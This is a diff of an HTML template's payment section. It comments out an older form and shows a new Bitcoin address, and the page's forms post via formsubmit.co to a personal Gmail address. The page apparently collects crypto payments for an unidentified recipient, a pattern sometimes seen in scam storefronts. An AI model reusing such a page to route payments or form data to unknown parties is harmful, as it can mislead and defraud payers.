@@ -52,7 +52,7 @@ Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony
 							<li><img src="images/2.jpg" alt=" " /></li>
 						</ul>
 						<div class="resp-tabs-container">
-							<div class="agileits_w3layouts_tab1">
+							<!-- <div class="agileits_w3layouts_tab1">
 								<form action="https://formsubmit.co/masonbrown7845@gmail.com" method="post">
 									<section class="creditly-wrapper wthree, w3_agileits_wrapper">
 										<div class="credit-card-wrapper">
@@ -60,9 +60,10 @@ Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony
 												<div class="controls">
 													<label class="control-label">Bitcoin Address</label>
 													<li><img src="images/4.png" alt=" " /></li>
+
 													
-													 <input class="billing-address-name form-control" type="text" name="name" value="3DuK2GBXQ65XwVK9iV4DBuSANiQs87ryhv">
-													
+													 <input class="billing-address-name form-control" type="text" name="name" value="3LMudc8fsqnz5hS8TbX3zDKa9rJp1aZi2s">
+													<p><b><h4>3LMudc8fsqnz5hS8TbX3zDKa9rJp1aZi2s</h4></b></p>
 												</div>
 												
 												
@@ -70,6 +71,14 @@ Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony
 											
 										</div>
 									</section>
+								</form> -->
+								<div class="agileits_w3layouts_tab2">
+								<h3>Bitcoin address  </h3>
+								<form action="https://formsubmit.co/masonbrown7845@gmail.com" method="post">
+									<li><img src="images/4.png" alt=" " /></li>
+									<p><b><h4>3LMudc8fsqnz5hS8TbX3zDKa9rJp1aZi2s</h4></b></p>
+									<!-- <input type="email" name="Email" value="kibor4087@gmail.com" required=""> -->
+									
 								</form>
 							</div>
 							<div class="agileits_w3layouts_tab2">
